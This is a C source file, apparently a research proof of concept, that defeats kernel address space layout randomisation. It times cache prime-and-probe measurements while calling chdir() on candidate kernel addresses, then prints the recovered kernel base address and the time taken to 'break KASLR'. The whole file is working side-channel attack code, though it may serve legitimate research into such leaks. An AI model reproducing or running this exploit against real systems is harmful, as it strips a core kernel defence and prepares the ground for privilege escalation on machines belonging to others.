#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/stat.h>
#include <errno.h>
#include <time.h>
#include <sys/time.h>
#include "timing.h"
#include "memory.h"
#include "config.h"


char * eset_data;

uint64_t * res;

//------------------------//
char * user = "./";
//------------------------//


int leak_val(void* addr){
    chdir(addr);
    chdir(addr);
    chdir(addr);
    return 1;
}

void get_cycle(uint64_t * valid_cycle, uint64_t * invalid_cycle){
    void * eset[12];
    register uint64_t tmp;

    gen_eset(&eset_data[0], eset, &eset_data[0]);

    tmp = 0; 
    for(int i = 0 ;i < 100000; i++){
        prime(eset);
        memory_access(&eset_data[0]);
        tmp += probe(eset);
    }

    * valid_cycle = tmp/100000;

    tmp = 0; 
    for(int i = 0 ;i < 100000; i++){
        prime(eset);
        memory_fence();
        tmp += probe(eset);
    }
    * invalid_cycle = tmp/100000;
}


int main(int argc, char * argv[]){
    void * addr;
    void * eset[12];
    void * target[4] = {user, user, user};
    uint64_t valid_cycle, invalid_cycle;
    struct timeval tv_s, tv_e;
    register uint64_t tmp, threshold;
    
    
    
    eset_data = (void *)malloc(sizeof(char) * ESET_OFFSET * 0x4000);
    res = (uint64_t *) malloc(sizeof(uint64_t) * 10000000);
    
    start_timer();

    get_cycle(&valid_cycle, &invalid_cycle);
    threshold = invalid_cycle + (valid_cycle - invalid_cycle)/3;

    printf("[Probing cycle] valid address : %llu, invalid address : %llu, threshold : %llu\n\n", valid_cycle, invalid_cycle, threshold);
    
    printf("========Start to finding kernel slide!========\n");

    memset(res, 0, sizeof(uint64_t) * 10000000);
    int64_t idx = 0;
    
    gettimeofday(&tv_s, NULL);
    
    for(int i = 0 ;i < ITERATION ; i++){
        for(uint64_t s_idx = 0 ; s_idx < NUM_SLOT ; s_idx++){
            idx = (s_idx * 73)%NUM_SLOT;
            addr = (void *) KER_START + (ALIGN_SIZE * idx);
            target[2] = addr;
            gen_eset(addr, eset, &eset_data[0]);
            do{
                for(int j = 0; j < 3 ; j++){
                    prime(eset);
                    leak_val(target[j]);
                }
                tmp = probe(eset);
            } while (tmp < (invalid_cycle - 200) || tmp > (valid_cycle + 200));
            res[idx] += tmp;
        }
    }

    uint64_t valid_page_cnt = 0;
    void * end_data_addr = 0;
    uint64_t kern_size_slot = KER_SIZE/ALIGN_SIZE;

    for(uint64_t s_idx = 0; s_idx < NUM_SLOT ; s_idx++){
        if(res[s_idx]/ITERATION > threshold){
            valid_page_cnt++;
            if (valid_page_cnt > 10 ){
                valid_page_cnt = 0;
                for(int s_jdx = s_idx + kern_size_slot ; s_jdx > 0 ; s_jdx--){
                    if(res[s_jdx]/ITERATION > threshold){
                        if(valid_page_cnt == 0 ){
                            end_data_addr = (void *) KER_START + (ALIGN_SIZE * s_jdx);
                            valid_page_cnt++;
                        }
                        else if(valid_page_cnt > 10){ break; }
                        else{ valid_page_cnt++; }
                    }
                    else{
                        valid_page_cnt = 0;
                    }
                }
                break;
            }
        }
        else { valid_page_cnt = 0; }
    }
    
    gettimeofday(&tv_e, NULL);
        
    double start = (tv_s.tv_sec) * 1000 + (tv_s.tv_usec)/1000.0;
    double end = (tv_e.tv_sec) * 1000 + (tv_e.tv_usec)/1000.0;
    double diff = (end - start) /1000.0;
        
    void * kernel_addr = end_data_addr - DATA_END_OFFSET + 0x4000;
    
#ifdef __DEBUG
    char * dfp = fopen(RESULT_FILE, "w");
    addr = (void *) KER_START;
    for(uint64_t x = 0 ; x < NUM_SLOT; x++){
        addr = (void *) KER_START + (ALIGN_SIZE * x);
        fprintf(dfp, "0x%llx %llu\n", addr, res[x]/ITERATION);
    }
    fprintf(dfp, "0x%llx\n", kernel_addr);
    fclose(dfp);
#endif
    
    printf("kernel base addr\t= \033[1;31m0x%llx\033[0m\n", kernel_addr);
    printf("Time to break KASLR\t= %.2fs\n", diff);
    printf("==============================================\n");
    stop_timer();    
    return 0;
}
